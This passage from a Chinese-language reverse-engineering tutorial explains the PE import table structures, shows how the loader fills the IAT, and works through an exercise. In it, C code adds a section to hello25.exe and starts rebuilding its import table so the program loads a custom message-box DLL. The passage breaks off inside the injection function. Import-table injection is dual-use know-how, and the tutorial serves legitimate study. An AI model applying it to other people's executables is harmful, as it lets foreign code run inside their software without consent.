src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142243765.png"></p><p>同理这个VirtualAddress也是一个RVA，需要转化为FOA后才能在文件中找到真正的导入表结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD   Characteristics;            <br>        DWORD   OriginalFirstThunk; <span class="hljs-comment">// 指向 导入名称表INT（ImportNameTable）的RVA</span><br>    &#125; DUMMYUNIONNAME;<br>    DWORD   TimeDateStamp;                  <br>    DWORD   ForwarderChain;                 <br>    DWORD   Name;                   <span class="hljs-comment">// 指向 DLL名称的地址 RVA</span><br>    DWORD   FirstThunk;             <span class="hljs-comment">// 指向 导入地址表IAT（ImportAddressTable）的RVA</span><br>&#125; IMAGE_IMPORT_DESCRIPTOR;<br><span class="hljs-keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;<br></code></pre></td></tr></table></figure><p>其中<code>OrginalFirstThunk</code>和<code>FirstThunk</code>各自再指向两张表，分别是INT表和IAT表，<code>name</code>则是要用到的dll的名字。在进一步解析IAT表和INT表之前，先做个实验。</p><p>随便使用调试器打开一个PE文件（我这里就没有用老师给出的文件了，但过程都是一模一样的，大家依葫芦画瓢就好啦），在里面找一找一些使用了系统调用的函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142331070.png"></p><p>比如这里，实际上这条指令就是<code>mov rax ds:[4083b0]</code>（大家可以捣鼓捣鼓怎么在x32里面看实际指令），在内存中转去4083B0这个地址，看看是什么</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142334814.png"></p><p>也就是说4083B0这个地址存放的是7FFFE86C3190，借助于调试器很方便的知道这个地址就是MessageBoxA的函数地址，这条指令也就等价于把MessageBoxa的地址给rax，然后再调用此函数。</p><p>而我们在文件中去看看4083B0这个地址存放的是什么呢（这里要减去ImageBase得到83B0，同时RVA转换FOA，才能在文件中找到，此地址在文件中对应的地址为37B0</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142341414.png"></p><p>37B0这个地址存放的则是一个86F6，很显然与运行时存放的值不一样。继续深究86F6又是什么，首先这是一个RVA，将其转换为FOA后，得到3AF6</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142344785.png"></p><p>当在文件中转去3AF6时，就会意料中地发现居然就是MessageBoxA这个函数名字，虽然前面还带了E9 01两字节不知道什么东西。</p><p>也就是说在内存中4083B0存放的是MessageBoxA的地址，而文件中则对应存放的是MessageBoxA的名字的RVA。换句话说存放的东西不一样，但两者之间肯定有一定的联系。实际上，3AF6处就是IAT表中的一项。</p><p>目前可以明确的是IAT表运行前运行后确实会发生变化，这其实就跟PE文件加载过程有关了。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142354979.png"></p><p>在PE文件加载之前，INT表和IAT表指向同一块地方，换句话说INT表和IAT表在运行前是完全一样的但是独立的两张表，在多数情况下它们处于不同的地址处，但是存放相同的值。在PE文件加载之后，操作系统就会根据INT表去找那些函数地址，比如MesaageBoxA的地址，然后填入IAT表中。</p><p>现在再来深入研究一下PE文件的加载</p><ul><li>首先操作系统给exe文件分配4GB的虚拟空间，然后把exe本身的代码加载到ImageBase处，通常来说exe是首先加载的，往往都能预计加载到ImageBase处，因此不需要使用重定位表修改。</li><li>其次，操作系统往4GB空间中加载各种DLL文件，由于DLL文件往往会有冲突，不能按照预计ImageBase装载，因此需要使用DLL本身提供的重定位表修复自己的地址</li><li>待所有DLL都加载并修复完后，操作系统根据exe的INT表去找函数地址，找到一个地址就填入IAT表中，遍历完INT表也就遍历完IAT表，由此完成对IAT表的修改（这个找函数地址的过程，其实就是调用GetPrcoAddress这个函数）</li><li>此时INT表存储了函数名称或者序号，IAT表存储了对应的函数地址，想要使用DLL一个函数也就简单了。</li></ul><p>也就是说文件加载前后INT表不变，文件加载前IAT表和INT表相同，文件加载后IAT表发生变化</p><p>那么INT表是如何存储函数名称或者序号呢？</p><p>先来看看INT表表项结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_THUNK_DATA32</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        PBYTE  ForwarderString;<br>        PDWORD Function;<br>        DWORD Ordinal; <span class="hljs-comment">//序号</span><br>        PIMAGE_IMPORT_BY_NAME  AddressOfData;<span class="hljs-comment">//指向IMAGE_IMPORT_BY_NAME</span><br>    &#125; u1;<br>&#125; IMAGE_THUNK_DATA32;<br></code></pre></td></tr></table></figure><p>注意这是个联合体，也就是说这个结构宽度是4个字节，虽然看起来这个联合体存放了很多东西。但又最简单的方法判断，如果这4个字节最高位是1，那么剩下31位就代表函数序号；如果最高位不为1，那么剩下31为就代表一个RVA指向另一个结构<code>IMAGE_IMPORT_BY_NAME</code>，即<code>if(INT &amp; 0x80000000 == 0x80000000) :序号导出 else RVA = IMAGE_IMPORT_BY_NAME</code></p><p>这个IMAGE_IMPORT_BY_NAME结构也简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_BY_NAME</span> &#123;</span><br>    WORD    Hint;<span class="hljs-comment">//可能为空，编译器决定 如果不为空 是函数在导出表中的索引</span><br>    BYTE    Name[<span class="hljs-number">1</span>];    <span class="hljs-comment">//函数名称，以0结尾</span><br>&#125; IMAGE_IMPORT_BY_NAME<br></code></pre></td></tr></table></figure><p>第二个成员就指向名字的第一个字节。</p><p>IAT表和INT表在加载前是完全一样的，其结构也是一样的，它们的成员都会指向相同的序号或者IMAGE_IMPORT_BY_NAME结构</p><p>至此你应该明白INT以及IAT是什么，他们是如何互相联系的，那么就来找一找<code>hello25.exe</code>的导入表吧！</p><p>同样利用PE相关工具可以很方便的找到</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20224753.png"></p><p>在<code>0x614</code>处</p><p>来划分一下结构吧</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20225124.png"></p><p>结合前面给出的结构体，五个DWIRD划分一组就可以了，相信你应该能看懂吧 &#x3D;)</p><p>我把最后的全零结构也划出来，是想告诉你操作系统就是根据同等大小的全零结构来判断一个表是不是结束，这个在很多地方都会见到</p><p>我们感兴趣的是第二个导入表，也就是绿线里面的，（因为<code>MessageBoxA</code>跟这个相关</p><p>那就对着结构体来解析吧！</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">DWORD</span>   OriginalFirstThunk INT表：<span class="hljs-number">0</span>x2058 RVA -&gt; <span class="hljs-number">0</span>x658 FOA<br><span class="hljs-attribute">DWORD</span>   TimeDateStamp;     时间戳:<span class="hljs-number">0</span>x00             <br><span class="hljs-attribute">DWORD</span>   ForwarderChain;    不重要的玩意儿:<span class="hljs-number">0</span>x00            <br><span class="hljs-attribute">DWORD</span>   Name;              指向DLL的名称:<span class="hljs-number">0</span>x209A RVA<br><span class="hljs-attribute">DWORD</span>   FirstThunk;     IAT表：<span class="hljs-number">0</span>x2008 RVA -&gt; <span class="hljs-number">0</span>x608 FOA<br></code></pre></td></tr></table></figure><p>看看INT表和IAT表</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/INT.png"></p><p>由RVA<code>0x208C</code>转FOA<code>0x68c</code>查看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20231032.png"></p><p>也就是划绿线部分啦（思考为什么到0停止）</p><p>这个划绿线部分就是<code>_IMAGE_IMPORT_BY_NAME </code>的结构，第一个<code>Word</code>是由编译器决定，第二个则是函数名字</p><p>终于我们找到了函数名字的用武之地</p><p>现在我们只需要把这个绿色结构体换个地方，然后把原来INT表、IAT表修改一下就好啦</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20231502.png"></p><p>思考：不修改IAT表，照样能够正常运行，为什么？</p><h3 id="5-编写一个弹出消息框的msg-dll文件，仅修改hello25-exe的引入函数节部分数据，使得hello25-exe运行时自动加载msg-dll，并弹出消息框。"><a href="#5-编写一个弹出消息框的msg-dll文件，仅修改hello25-exe的引入函数节部分数据，使得hello25-exe运行时自动加载msg-dll，并弹出消息框。" class="headerlink" title="5.编写一个弹出消息框的msg.dll文件，仅修改hello25.exe的引入函数节部分数据，使得hello25.exe运行时自动加载msg.dll，并弹出消息框。"></a>5.编写一个弹出消息框的msg.dll文件，仅修改hello25.exe的引入函数节部分数据，使得hello25.exe运行时自动加载msg.dll，并弹出消息框。</h3><p>（看此题之前，建议先看第六题，你会对导入表有一个更清晰的认识）</p><p>首先，你需要会编写一个dll文件，并使用，但这个并不是重点，可以参考<a href="https://blog.csdn.net/L_Mu2000/article/details/115418810">这篇文章</a></p><p>这是我的DLL代码</p><p>这题的原理是这样的：操作系统会根据导入表来加载DLL，而在DLL加载的时候就可以执行回调函数（与C++里面的魔法方法类似，就是自动执行那种），那么我们就要想办法让操作系统加载我们的DLL。</p><p>还记不记得之前提及导入表以一个全零的结构作为结束，如果我们给这个结构改一改，我们人为的在导入表加一份我们自己DLL</p><p>换句话说，我们需要人为在导入表里添加一项DLL，来骗过操作系统。但是会面临一个问题，即原来的导入表不够位置，因为操作系统是根据导入表最后的全0结构来判断是否导入表是否结束，如果说原来的导入表后面只有20个零（一个导入表结构的大小），那么显然是不能在此基础上添加导入表的，因为这样就会加载进错误的导入表，从而导致程序崩溃。</p><p>我这里采取移动导入表的形式（还有一种方式把原来的ExitProcess等字符串全部后移，这样就有空间增加我们的自己的导入表了，但是也得修复，这个方法我放在第六题讲）</p><p>移动最好的方式是新开一个节（如何新增一个节也是一个值得讨论的话题，参考下<a href="http://yring-me.com/2023/07/04/PE_4/">这篇文章</a>），然后根据目录项开始逐表逐表copy，你可能有一个疑问——为什么要逐表，而不直接使用目录项的size成员呢？原因有二，第一这个size是不准确的，在许多编译器中都会将此值置0，你也可以自己把它设置成0，程序一样可以正常运行；第二这个size可能不只包含导入表，还可能包含了INT表，IAT表等所有的大小，但是我们只想copy单纯的导入表。</p><p>因此需要逐表逐表copy，然后用20字节来做新表的大小，再用20字节做结束的标志</p><p>新增INT表、IAT表</p><p>仅仅创建新表是不够的，因此此时表结构全为0，即使设置了DLL的名字。因为操作系统会看这个表的INT表、IAT表，如果这两张表为0，就说明没有用到这个DLL，就不会把他加载程序4GB空间。因此需要新增INT表、IAT表，我们只需要新增一项就可以使得操作系统加载DLL了。</p><p>同理INT表、IAT表也需要全零0结构作为结束，而这两张表表项大小是4字节，因此每一张表都需要8字节来完成新增操作。此后就是设置这两张表的表项，使其指向PIMAGE_IMPORT_BY_NAME结构（当然使用序号的方式也是可以的）</p><p>简单来说，就是重新构这几张表的指向关系，也就是如图的所有箭头</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307260019297.png"></p><p>只要重新建立这些箭头指向，也就代表一个新的导入表成功建立</p><p>这里我也直接给出我的代码吧</p><p>代码有注释，相信你能琢磨明白的！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_SIZE 0x3000</span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>     <span class="hljs-comment">//最后一个节区</span><br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            <br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//最后一个节区</span><br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Section_add</span><span class="hljs-params">(FILE* fp,<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    DWORD size =  Size(fp);<br>    DWORD new_size = size + ADD_SIZE ;<br><br>    <span class="hljs-type">char</span>* NewBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(new_size);<br>    <span class="hljs-keyword">if</span> (!NewBuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed to creat buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">memset</span>(NewBuffer,<span class="hljs-number">0</span>,new_size);<br>    <span class="hljs-built_in">memcpy</span>(NewBuffer,buffer,size);<br><br>    <span class="hljs-comment">//初始化PE头部信息</span><br>DosHeader = (PIMAGE_DOS_HEADER)NewBuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(NewBuffer + DosHeader-&gt;e_lfanew);<br>FILEHeader = (PIMAGE_FILE_HEADER)(NewBuffer+DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//最后一个节表地址</span><br>PIMAGE_SECTION_HEADER LastSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader+IMAGE_SIZEOF_SECTION_HEADER*(FILEHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>));<br><span class="hljs-comment">//新节表地址</span><br>PIMAGE_SECTION_HEADER NewSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader + IMAGE_SIZEOF_SECTION_HEADER * (FILEHeader-&gt;NumberOfSections));<br><br>    <span class="hljs-comment">//判断剩余空间</span><br>    DWORD Remained_size = (DWORD)(OptionalHeader-&gt;SizeOfHeaders - DosHeader-&gt;e_lfanew - <span class="hljs-number">4</span><br>- IMAGE_SIZEOF_FILE_HEADER - IMAGE_SIZEOF_SECTION_HEADER * FILEHeader-&gt;NumberOfSections);<br><span class="hljs-keyword">if</span> (Remained_size &lt; <span class="hljs-number">2</span> * IMAGE_SIZEOF_SECTION_HEADER)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do not have enough space!\n&quot;</span>);<br><span class="hljs-built_in">free</span>(NewBuffer);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">//===================修改信息====================</span><br><span class="hljs-comment">//其他头部需要修改的信息</span><br>FILEHeader-&gt;NumberOfSections += <span class="hljs-number">1</span>;<br>    OptionalHeader-&gt;SizeOfImage += ADD_SIZE;<br>    <br>    <span class="hljs-comment">//填入数据</span><br>    <span class="hljs-built_in">memcpy</span>(NewSection-&gt;Name,<span class="hljs-string">&quot;.NewSec&quot;</span>,<span class="hljs-number">8</span>);<br>    NewSection-&gt;Misc.VirtualSize = ADD_SIZE;<br>    NewSection-&gt;SizeOfRawData = ADD_SIZE;<br>    NewSection-&gt;PointerToRawData = LastSection-&gt;PointerToRawData + LastSection-&gt;SizeOfRawData;<br><br>DWORD add_size = LastSection-&gt;Misc.VirtualSize &gt; LastSection-&gt;SizeOfRawData ? LastSection-&gt;Misc.VirtualSize : LastSection-&gt;SizeOfRawData;<br><br>    NewSection-&gt;VirtualAddress = LastSection-&gt;VirtualAddress + add_size;<br><br>    <span class="hljs-comment">//找到开始的地方</span><br>    <span class="hljs-keyword">if</span> (NewSection-&gt;VirtualAddress % OptionalHeader-&gt;SectionAlignment)<br>&#123;<br>NewSection-&gt;VirtualAddress = NewSection-&gt;VirtualAddress / OptionalHeader-&gt;SectionAlignment * OptionalHeader-&gt;SectionAlignment +OptionalHeader-&gt;SectionAlignment;<br>&#125;<br><br>NewSection-&gt;Characteristics = <span class="hljs-number">0xC0000040</span>;<br><br>    <span class="hljs-keyword">return</span> NewBuffer;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">DLL_INJECT</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//初始化PE头部信息</span><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer+DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//定位到新节区开始</span><br>    PIMAGE_SECTION_HEADER NewSec = SectionHeader + FILEHeader-&gt;NumberOfSections - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span>* pNewSec = Buffer + NewSec-&gt;PointerToRawData;<br>    <span class="hljs-comment">//定位到导入表</span><br>    